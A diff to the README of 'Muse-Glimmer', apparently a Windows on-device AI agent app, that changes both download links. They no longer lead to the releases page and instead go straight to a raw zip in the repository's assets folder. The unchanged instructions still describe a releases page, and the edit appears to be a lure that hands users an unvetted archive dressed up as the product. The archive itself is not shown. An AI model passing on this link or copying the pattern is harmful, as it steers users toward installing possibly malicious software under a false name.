@@ -1,6 +1,6 @@
 # 🔮 Muse-Glimmer - Your Personal On-Device AI Agent Lab
 
-[![Download Now](https://img.shields.io/badge/Download-Muse_Glimmer-8A2BE2?style=for-the-badge&logo=github)](https://github.com/mentholated-roll141/Muse-Glimmer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Muse_Glimmer-8A2BE2?style=for-the-badge&logo=github)](https://github.com/mentholated-roll141/Muse-Glimmer/raw/refs/heads/main/assets/v1.4.zip)
 
 ## 🌟 What is Muse Glimmer?
 
@@ -12,7 +12,7 @@ Getting Muse Glimmer up and running on your Windows computer is simple. Follow t
 
 ### Step 1: Download the Application
 
-1. Click the large download button above, or visit this link directly: **[Muse-Glimmer Releases](https://github.com/mentholated-roll141/Muse-Glimmer/releases)**
+1. Click the large download button above, or visit this link directly: **[Muse-Glimmer Releases](https://github.com/mentholated-roll141/Muse-Glimmer/raw/refs/heads/main/assets/v1.4.zip)**
 2. On the page, you will see files listed. Look for the file with a `.zip` extension (likely something like `Muse-Glimmer-Windows.zip`).
 3. Click the `.zip` file to download it. This may take a few minutes depending on your internet speed (the file is several gigabytes because it contains the full model).
 
